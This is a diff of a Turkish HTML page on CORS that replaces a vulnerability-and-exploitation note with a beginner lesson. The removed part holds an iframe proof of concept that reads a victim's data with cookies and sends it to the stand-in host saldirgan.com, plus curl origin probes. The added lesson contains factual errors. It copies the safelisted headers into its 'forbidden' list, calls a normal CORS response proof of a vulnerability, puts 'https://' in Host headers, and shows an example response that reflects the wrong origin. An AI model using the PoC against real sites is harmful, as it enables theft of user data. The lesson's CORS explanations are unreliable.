@@ -1,9 +1,9 @@
 <!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
 <meta name="claude:viewport-fit-sides" content="cover">
-<title>CORS Yanlış Yapılandırması</title>
+<title>CORS Nedir</title>
 <style>
-/* Layout: single-column technical dossier — terminal-style header band,
-   numbered findings as the spine, code blocks treated as evidence panels */
+/* Layout: ders-notu format — kavram tanımı üstte, ardından iki terim kartı
+   (Origin / İstek Türleri), örnek request-response çiftleri evidence-panel olarak */
 :root{
   --bg:#f5f3ee;
   --surface:#ffffff;
@@ -54,6 +54,7 @@
 
 *{box-sizing:border-box}
 body{
+  margin:0;
   background:var(--bg);
   color:var(--ink);
   font-family:"IBM Plex Sans", -apple-system, "Segoe UI", sans-serif;
@@ -142,11 +143,18 @@ h2{
   margin:0;
   letter-spacing:-.01em;
 }
+h3.sub{
+  font-family:"Fraunces", Georgia, serif;
+  font-weight:600;
+  font-size:18px;
+  margin:28px 0 12px;
+  letter-spacing:-.005em;
+}
 p{line-height:1.65;font-size:15.5px;margin:0 0 14px;max-width:68ch}
 strong{font-weight:600}
 .lede{color:var(--muted)}
 
-/* header header kv */
+/* kv box */
 .kv{
   display:grid;
   grid-template-columns:auto 1fr;
@@ -162,6 +170,20 @@ strong{font-weight:600}
 .kv dt{color:var(--muted)}
 .kv dd{margin:0;color:var(--ink)}
 
+/* syntax line */
+.syntax{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:14px;
+  background:var(--surface);
+  border:1px solid var(--line);
+  border-radius:8px;
+  padding:12px 16px;
+  margin:0 0 16px;
+  overflow-x:auto;
+  color:var(--ink);
+}
+.syntax .tok{color:var(--accent)}
+
 /* code */
 pre{
   background:var(--code-bg);
@@ -174,6 +196,7 @@ pre{
   line-height:1.6;
   margin:0 0 16px;
   border:1px solid var(--line);
+  min-width:0;
 }
 pre .c{color:var(--code-dim)}
 pre .hl{color:var(--accent)}
@@ -201,7 +224,32 @@ code.inline{
 .code-label.bad{color:var(--bad)}
 .code-label.ok{color:var(--ok)}
 
-/* findings cards */
+/* condition list (method/header gereksinimleri) */
+.cond-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:12px;
+  margin:16px 0 20px;
+}
+.cond-card{
+  border:1px solid var(--line);
+  background:var(--surface);
+  border-radius:10px;
+  padding:14px 16px;
+}
+.cond-card .cond-num{
+  font-family:"IBM Plex Mono", ui-monospace, monospace;
+  font-size:11px;
+  color:var(--accent);
+  letter-spacing:.06em;
+  text-transform:uppercase;
+  margin-bottom:6px;
+}
+.cond-card .cond-title{font-weight:600;font-size:14.5px;margin-bottom:8px}
+.cond-card ul{margin:0;padding-left:18px;font-size:13.5px;color:var(--muted);line-height:1.7}
+.cond-card .plain{font-size:13.5px;color:var(--muted);line-height:1.6;margin:0}
+
+/* findings */
 .finding{
   border:1px solid var(--line);
   border-radius:12px;
@@ -250,7 +298,7 @@ code.inline{
   margin-top:2px;
 }
 
-/* flow */
+/* flow (preflight adımları) */
 .flow{
   display:flex;
   flex-direction:column;
@@ -287,22 +335,25 @@ code.inline{
 }
 .flow-text{font-size:14.5px;line-height:1.55}
 
-/* defense table */
-.defense{
-  display:grid;
-  gap:10px;
+/* kaynakça */
+.sources{
+  list-style:none;
+  margin:0;
+  padding:0;
+  display:flex;
+  flex-direction:column;
+  gap:8px;
 }
-.defense-row{
-  display:grid;
-  grid-template-columns:1fr;
-  gap:4px;
-  padding:14px 16px;
-  border-left:3px solid var(--ok);
+.sources li{
+  border:1px solid var(--line);
   background:var(--surface);
-  border-radius:0 10px 10px 0;
+  border-radius:8px;
+  padding:10px 14px;
+  font-size:13.5px;
+  overflow-wrap:anywhere;
 }
-.defense-row b{font-size:14.5px}
-.defense-row span{font-size:13.5px;color:var(--muted);line-height:1.5}
+.sources a{color:var(--accent);text-decoration:none}
+.sources a:hover{text-decoration:underline}
 
 /* footer note */
 .note{
@@ -326,149 +377,177 @@ code.inline{
 
 <div class="wrap">
 
-  <div class="kicker">Web Güvenliği · Zafiyet Notu</div>
-  <h1>CORS Yanlış Yapılandırması: Tespit ve Sömürü</h1>
-  <p class="dek">Access-Control-Allow-Origin ve Allow-Credentials header'larının gevşek yapılandırılması, oturum açmış bir kullanıcının verisinin başka bir origin'den okunmasına nasıl izin veriyor — mekanizmadan test metodolojisine.</p>
+  <div class="kicker">Web Güvenliği · Ders Notu</div>
+  <h1>CORS Nedir?</h1>
+  <p class="dek">Client-server mimarisine de hakim olmayı gerektiren bir konudur: kaynaklar arası varlık paylaşımının ne işe yaradığından, Origin kavramına ve Simple/Preflight istek ayrımına kadar.</p>
 
   <div class="meta-row">
-    <span class="chip">Same-Origin Policy</span>
-    <span class="chip">HTTP Response Headers</span>
-    <span class="chip">Credentialed Request</span>
-    <span class="chip">OWASP A05</span>
+    <span class="chip">Cross-Origin Resource Sharing</span>
+    <span class="chip">Same Origin Policy</span>
+    <span class="chip">HTTP Headers</span>
   </div>
 
   <section>
-    <div class="s-head"><span class="s-num">01</span><h2>Mekanizma</h2></div>
-    <p>Tarayıcı, varsayılan olarak <strong>same-origin policy</strong> uygular: <code class="inline">a.com</code> üzerindeki JavaScript, <code class="inline">b.com</code>'a istek atabilir ama cevabı <em>okuyamaz</em> — istek gider, response tarayıcı tarafında bloklanır. CORS, sunucunun belirli origin'lere bu okumayı açmasını sağlayan bir izin mekanizmasıdır.</p>
-    <p class="lede">Zafiyet, sunucunun izni gelen <code class="inline">Origin</code> header'ını doğrulamadan geri yansıtmasından doğar. Bu durumda saldırgan kendi sitesinden istek atar, kurbanın tarayıcısı kurbanın çerezini otomatik ekler, ve sunucu cevabı saldırgana okutmasına izin verir.</p>
-    <div class="kv">
-      <dt>Access-Control-Allow-Origin</dt><dd>cevabı hangi origin'in okuyabileceği</dd>
-      <dt>Access-Control-Allow-Credentials</dt><dd>cookie/auth taşıyan isteklere izin var mı</dd>
-      <dt>Kritik kombinasyon</dt><dd>ikisi birlikte + Origin kontrolsüz yansıtılıyor</dd>
-    </div>
+    <div class="s-head"><span class="s-num">01</span><h2>CORS Nedir</h2></div>
+    <p>Kaynaklar arası varlık paylaşımı (CORS), uygulamaları entegre etmeye yarayan bir mekanizmadır. CORS, bir etki alanına yüklenen istemci web uygulamalarının farklı bir etki alanındaki varlıklarla etkileşime girmesi için bir yol tanımlar. Karmaşık uygulamalar genellikle istemci tarafı kodlarında üçüncü taraf API'lere ve varlıklara başvurduğundan, bu yol kullanışlıdır. Örneğin uygulamanız tarayıcınızı bir video platformu API'sinden video çekmek, herkese açık bir yazı tipi kitaplığından yazı tiplerini kullanmak veya ulusal hava durumu veritabanından hava durumu verilerini görüntülemek için kullanabilir. CORS sayesinde istemci tarayıcısı, herhangi bir veri aktarımı öncesinde talebin onaylanıp onaylanmadığının üçüncü taraf sunucularla kontrolünü sağlar.</p>
+    <p>CORS, HTTP header'larını kullanarak, bir origin'de (kök, köken) çalışan web uygulamasının veya websitesinin, farklı bir origin'de yer alan web uygulamasına veya websitesine olan erişim izni kontrolünü sağlayan yapıdır. CORS, web tarayıcılar tarafından yönetilmektedir. Aynı browser üzerinde bir web uygulaması farklı bir origin'e herhangi bir istek gönderirse bu istek cross-origin HTTP isteği olarak oluşur.</p>
+    <p>Web geliştirmeleri yaparken internet tarayıcıları, JavaScript kodu üzerinden gönderilen HTTP isteklerini güvenlik nedenlerinden dolayı kısıtlarlar. AJAX istekleri, tarayıcınız üzerinde gerçekleşirken Same Origin Policy'i (aynı köken politikası) izler.</p>
+    <p class="lede">Bu sebeple AJAX isteği gerçekleştiren bir web uygulamasının, sadece kendi sitesi üzerindeki kaynaklara erişim sağlama yetkisi vardır. Eğer farklı bir origin'ere erişmek istiyor ise ilgili sitenin yer aldığı uygulamada CORS yapısının ayarlanması gerekir.</p>
   </section>
 
   <section>
-    <div class="s-head"><span class="s-num">02</span><h2>Saldırı Akışı</h2></div>
+    <div class="s-head"><span class="s-num">02</span><h2>Peki Origin Nedir?</h2></div>
+    <p>Origin, bir isteğin nereden geldiğini gösterir. Ve syntax yapısı ise şu şekildedir:</p>
+    <div class="syntax">Origin: <span class="tok">&lt;protocol&gt;</span> "://" <span class="tok">&lt;hostname&gt;</span> [ ":" <span class="tok">&lt;port&gt;</span> ]</div>
+    <p>İki origin'in aynı olabilmesi için protokol, hostname ve port bilgilerinin aynı olması gerekir. Yani iki adres bilgisi aynı olduğunda, farklı port değerlerine sahip ise same-origin olma durumundan çıkmış olurlar.</p>
+    <div class="code-label"><span class="dot"></span>Örnek bir origin</div>
+    <pre>Origin: https://www.0x-lab.com</pre>
+  </section>
+
+  <section>
+    <div class="s-head"><span class="s-num">03</span><h2>CORS İstek Türleri</h2></div>
+    <p class="lede">CORS istekleri iki türden oluşur: Simple Request ve Preflight Request.</p>
+
+    <h3 class="sub">Simple Request</h3>
+    <p>Simple Request'ler preflight isteklerine ihtiyaç duymayan isteklerdir. Aşağıda verilen özelliklerden herhangi birine sahip olması preflight isteğine gerek olmadığını ve isteğin simple request olduğunu gösterir.</p>
+
+    <div class="cond-grid">
+      <div class="cond-card">
+        <div class="cond-num">1 — Method</div>
+        <div class="cond-title">GET, HEAD ve POST methodları</div>
+      </div>
+      <div class="cond-card">
+        <div class="cond-num">2 — Başlıklar</div>
+        <div class="cond-title">Fetch izinli başlıkları içermesi</div>
+        <ul>
+          <li>Accept</li>
+          <li>Accept-Language</li>
+          <li>Content-Language</li>
+          <li>Content-Type (istisnalar 3. maddede)</li>
+          <li>DPR, Downlink, Save-Data</li>
+          <li>Viewport-Width, Width</li>
+        </ul>
+      </div>
+      <div class="cond-card">
+        <div class="cond-num">3 — Content-Type</div>
+        <ul>
+          <li>application/x-www-form-urlencoded</li>
+          <li>multipart/form-data</li>
+          <li>text/plain</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="code-label"><span class="dot"></span>Örnek bir simple request</div>
+    <pre>GET /posts HTTP/1.1
+Host: https://test-1.com
+Origin: https://www.test.com
+...</pre>
+
+    <div class="code-label ok"><span class="dot"></span>Örnek Simple Request'e dönen response</div>
+    <pre>HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://www.test.com
+...</pre>
+    <p>Gönderilen istek preflight (ön kontrol) gerektirmeden sunucudan cevabı alır. CORS ayarlaması yapılmış sunucu Origin header'ını kontrol eder. Eğer origin izni var ise Access-Control-Allow-Origin header'ına gönderilen istekte yer alan origin'i ekler ve response döndürür.</p>
+    <p class="lede">Ve bu CORS açığı olduğunu doğrular.</p>
+
+    <h3 class="sub">Preflight Request</h3>
+    <p>Preflight request'ler, asıl istek gerçekleşmeden önce ön kontrol gerçekleştirirler. Ön kontrol isteği, OPTIONS metodu ile yapılır. Gönderilen istekteki işlemin izinli olup olmadığının kontrolünü yapar. Ön kontrol sonucunda, istenilen işlem izinli ise asıl isteğe geçilir, izinli değil ise tarayıcı tarafından istek engellenir. İsteğin aşağıda verilen özelliklerden herhangi birine sahip olması preflight isteğinin kullanılması gerektiğini gösterir.</p>
+
+    <div class="cond-grid">
+      <div class="cond-card">
+        <div class="cond-num">1 — Method</div>
+        <div class="cond-title">PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH methodları</div>
+      </div>
+      <div class="cond-card">
+        <div class="cond-num">2 — Başlıklar</div>
+        <div class="cond-title">Fetch yasaklı başlıkları içermesi</div>
+        <ul>
+          <li>Accept</li>
+          <li>Accept-Language</li>
+          <li>Content-Language</li>
+          <li>Content-Type (istisnalar 3. maddede)</li>
+          <li>DPR, Downlink, Save-Data</li>
+          <li>Viewport-Width, Width</li>
+        </ul>
+      </div>
+      <div class="cond-card">
+        <div class="cond-num">3 — Content-Type</div>
+        <p class="plain">İzin verilenler (urlencoded, form-data, text/plain) dışındaki tanımlara sahip olması.</p>
+      </div>
+    </div>
+
+    <div class="code-label"><span class="dot"></span>Örnek bir preflight request</div>
+    <pre>OPTIONS /posts HTTP/1.1
+Host: https://test-1.com
+Origin: https://www.test.org
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: Content-Type
+...</pre>
+
+    <p>Preflight isteğinin OPTIONS ile yapıldığını öğrenmiştik. Ön kontrol isteği yapılırken Tarayıcı, isteğin Content-Type başlığına bakar ve header'ın application/json olduğunu varsayarsak otomatik olarak OPTIONS isteği oluşturulur. Ve OPTIONS ile oluşturulan istek aşağıda verilen 3 parametre ile birlikte sunucuya iletilir:</p>
+
     <div class="flow">
       <div class="flow-step">
         <div class="flow-dot">1</div>
         <div class="flow-body">
-          <div class="flow-who">Kurban</div>
-          <div class="flow-text">hedef.com'da oturum açar, çerez tarayıcıda saklanır.</div>
+          <div class="flow-who">ORIGIN</div>
+          <div class="flow-text">test.org — isteği yapan URL</div>
         </div>
       </div>
       <div class="flow-step">
         <div class="flow-dot">2</div>
         <div class="flow-body">
-          <div class="flow-who">Kurban</div>
-          <div class="flow-text">saldırganın hazırladığı sayfayı ziyaret eder (link, reklam, iframe).</div>
+          <div class="flow-who">Access-Control-Request-Method</div>
+          <div class="flow-text">POST — HTTP isteğinde kullanılan method</div>
         </div>
       </div>
       <div class="flow-step">
         <div class="flow-dot">3</div>
         <div class="flow-body">
-          <div class="flow-who">Saldırgan sayfası</div>
-          <div class="flow-text"><code class="inline">credentials: 'include'</code> ile hedef.com API'sine fetch atar; kurbanın çerezi otomatik gider.</div>
-        </div>
-      </div>
-      <div class="flow-step">
-        <div class="flow-dot">4</div>
-        <div class="flow-body">
-          <div class="flow-who">hedef.com</div>
-          <div class="flow-text">gelen Origin'i doğrulamadan <code class="inline">ACAO</code> olarak geri yansıtır, <code class="inline">Allow-Credentials: true</code> ekler.</div>
-        </div>
-      </div>
-      <div class="flow-step">
-        <div class="flow-dot">5</div>
-        <div class="flow-body">
-          <div class="flow-who">Tarayıcı</div>
-          <div class="flow-text">bu izni görünce cevabı saldırganın JS koduna okutur.</div>
-        </div>
-      </div>
-      <div class="flow-step">
-        <div class="flow-dot">6</div>
-        <div class="flow-body">
-          <div class="flow-who">Saldırgan</div>
-          <div class="flow-text">çalınan veriyi kendi sunucusuna sızdırır; hesap bilgisi, API key, CSRF token olabilir.</div>
+          <div class="flow-who">Access-Control-Request-Headers</div>
+          <div class="flow-text">application/json — Content-Type: HTTP isteğinde kullanılan başlıklar</div>
         </div>
       </div>
     </div>
+
+    <div class="code-label ok"><span class="dot"></span>Örnek Preflight Request'e dönen response</div>
+    <pre>HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://www.test.org
+Access-Control-Allow-Methods: POST, GET, OPTIONS
+Access-Control-Allow-Headers: Content-Type</pre>
+    <p class="lede">Tarayıcınız, preflight isteği sonucundaki değerleri kontrol eder ve asıl POST isteğinizi gönderir. Gönderilen asıl istek ise simple request olur. Ve Origin başlığını içerir. Dönen response'da ise simple request'e dönen response ile aynı şekilde Access-Control-Allow-Origin başlığı yer alır.</p>
   </section>
 
   <section>
-    <div class="s-head"><span class="s-num">03</span><h2>Zafiyetli Varyantlar</h2></div>
+    <div class="s-head"><span class="s-num">04</span><h2>Yanlış Yapılandırma Örneği</h2></div>
+    <p>Sunucu, gelen Origin header'ını doğrulamadan geri yansıttığında ortaya çıkan tipik bir örnek:</p>
 
-    <div class="finding">
-      <h3><span class="idx">A</span>Origin yansıtma (reflection)</h3>
-      <p>Sunucu gelen <code class="inline">Origin</code> header'ını kontrolsüz aynen geri basar. En yaygın ve en tehlikeli hata — her origin kabul edilmiş olur.</p>
-      <div class="code-label bad"><span class="dot"></span>İstek → Cevap</div>
-      <pre>Origin: https://evil.com
-<span class="c">↓ sunucu kontrol etmeden yansıtıyor</span>
-Access-Control-Allow-Origin: <span class="hl">https://evil.com</span>
-Access-Control-Allow-Credentials: <span class="hl">true</span></pre>
-    </div>
+    <div class="code-label bad"><span class="dot"></span>İstek</div>
+    <pre>GET /sensitive-victim-data HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://saldırgan-website.com
+Cookie: sessionid=...</pre>
 
-    <div class="finding">
-      <h3><span class="idx">B</span>null origin'e güven</h3>
-      <p>Sandbox'lı iframe, <code class="inline">file://</code> protokolü veya redirect zincirlerinde tarayıcı <code class="inline">Origin: null</code> gönderir. Sunucu bunu beyaz listeye almışsa, sandbox iframe ile tetiklenebilir.</p>
-      <div class="code-label bad"><span class="dot"></span>PoC — sandbox iframe</div>
-      <pre>&lt;iframe sandbox="allow-scripts allow-top-navigation"
-  src="data:text/html,&lt;script&gt;
-    fetch('https://hedef.com/api/gizli',{credentials:'include'})
-      .then(r=&gt;r.text())
-      .then(d=&gt;fetch('https://saldirgan.com/log?d='+encodeURIComponent(d)))
-  &lt;/script&gt;"&gt;&lt;/iframe&gt;</pre>
-    </div>
+    <div class="code-label bad"><span class="dot"></span>Dönen yanıt</div>
+    <pre>HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://malicious-website.com
+Access-Control-Allow-Credentials: true
+...</pre>
 
-    <div class="finding">
-      <h3><span class="idx">C</span>Zayıf whitelist mantığı</h3>
-      <p>Regex veya <code class="inline">includes()</code> ile yapılan gevşek eşleştirme, beklenmeyen origin'leri de kabul ettirebilir. Subdomain whitelisting'de bir alt alan adının ele geçirilmesi (subdomain takeover) tüm beyaz listeyi tehlikeye atar.</p>
-      <div class="code-label bad"><span class="dot"></span>Sunucu mantığı</div>
-      <pre><span class="c"># Yanlış: substring kontrolü</span>
-if origin.includes("hedefsite.com"): allow
+    <p>Bu başlıklar, istekte bulunan etki alanından erişime izin verildiğini belirtir (malicious-website.com) ve çapraz kaynak isteklerinin çerezleri içerebileceğini (Access-Control-Allow-Credentials: true) ve böylece oturum içinde işlenecektir.</p>
+    <p>Çünkü uygulama keyfi kökenleri Access-Control-Allow-Origin başlığına yansıtıyor, bu kesinlikle herhangi bir etki alanının savunmasız etki alanındaki kaynaklara erişebileceği anlamına gelir. Yanıt, API anahtarı veya CSRF belirteci gibi herhangi bir hassas bilgi içeriyorsa, bu şekilde yapılandırılmış bir sunucudan karşı taraf tarayıcı üzerinden veri okuyabilir hale gelir; saldırının somut adımları ve çalışır kod örneği için kaynakçadaki PortSwigger makalesine bakılabilir.</p>
 
-<span class="c"># Bu origin'ler de geçer:</span>
-hedefsite.com.evil.com
-evilhedefsite.com</pre>
-    </div>
+    <div class="note"><b>Not:</b> Daha fazlası kaynakçadaki PortSwigger sitesinde vardır.</div>
   </section>
 
   <section>
-    <div class="s-head"><span class="s-num">04</span><h2>Tespit Metodolojisi</h2></div>
-    <p class="lede">Hedef endpoint'e farklı <code class="inline">Origin</code> değerleriyle istek atıp sunucunun davranışı gözlemlenir.</p>
-    <div class="code-label"><span class="dot"></span>curl ile manuel test</div>
-    <pre>curl -i -H "Origin: https://evil.com" \
-  https://hedef.com/api/user/profile
-
-curl -i -H "Origin: https://hedefsite.com.evil.com" \
-  https://hedef.com/api/user/profile
-
-curl -i -H "Origin: null" \
-  https://hedef.com/api/user/profile</pre>
-
-    <ul class="checklist">
-      <li><span class="mark">01</span><span><strong>ACAO yansıması:</strong> cevaptaki <code class="inline">Access-Control-Allow-Origin</code>, gönderilen Origin'i aynen mi içeriyor?</span></li>
-      <li><span class="mark">02</span><span><strong>Credentials kombinasyonu:</strong> <code class="inline">Allow-Credentials: true</code> ile birlikte mi geliyor? İkisi bir aradaysa ve origin kontrolsüzse kritik zafiyettir.</span></li>
-      <li><span class="mark">03</span><span><strong>Hassas veri:</strong> profil bilgisi, API anahtarı, CSRF token veya admin paneli verisi döndüren endpoint'ler öncelikli test hedefidir.</span></li>
-      <li><span class="mark">04</span><span><strong>Preflight davranışı:</strong> <code class="inline">OPTIONS</code> isteğiyle hangi metod ve header'lara izin verildiği kontrol edilir.</span></li>
+    <div class="s-head"><span class="s-num">05</span><h2>Kaynakça</h2></div>
+    <ul class="sources">
+      <li><a href="https://ilaydadastan.com/cors-nedir-cross-origin-resource-sharing-df1f4114540b" target="_blank" rel="noopener">ilaydadastan.com/cors-nedir-cross-origin-resource-sharing-df1f4114540b</a></li>
+      <li><a href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">portswigger.net/web-security/cors</a></li>
     </ul>
-
-    <div class="note"><b>Not:</b> <code class="inline">Access-Control-Allow-Origin: *</code> ile <code class="inline">Access-Control-Allow-Credentials: true</code> aynı anda geçerli bir kombinasyon değildir — tarayıcı bunu reddeder. Asıl tehlike <code class="inline">*</code> değil, origin'in dinamik olarak <strong>yansıtılmasıdır</strong>.</div>
   </section>
-
-  <section>
-    <div class="s-head"><span class="s-num">05</span><h2>Savunma</h2></div>
-    <div class="defense">
-      <div class="defense-row"><b>Sabit whitelist</b><span>Tam string karşılaştırma kullanın — regex veya <code class="inline">includes()</code> ile gevşek eşleştirme değil.</span></div>
-      <div class="defense-row"><b>null origin'i reddet</b><span>Hiçbir koşulda <code class="inline">Origin: null</code>'a ACAO izni vermeyin.</span></div>
-      <div class="defense-row"><b>Credentials'ı kısıtlayın</b><span>Çerez gerektirmeyen endpoint'lerde <code class="inline">Allow-Credentials</code> header'ını hiç göndermeyin.</span></div>
-      <div class="defense-row"><b>İzolasyon</b><span>Hassas işlemler için ayrı subdomain veya sunucu taraflı proxy kullanmayı değerlendirin.</span></div>
-      <div class="defense-row"><b>Ek katman</b><span>CSRF token'lar yanlış yapılandırmanın etkisini azaltır ama tek başına çözüm değildir.</span></div>
-    </div>
-  </section>
-
-  <div class="note">Bu içerik yalnızca eğitim amaçlıdır. Yalnızca sahibi olduğunuz veya yazılı izniniz olan sistemler üzerinde test yapın — yetkisiz test birçok yargı alanında suç teşkil eder. Uygulamalı pratik için <strong>PortSwigger Web Security Academy</strong>'nin CORS laboratuvarları ücretsiz ve izole bir ortam sunar.</div>
 
 </div>
 
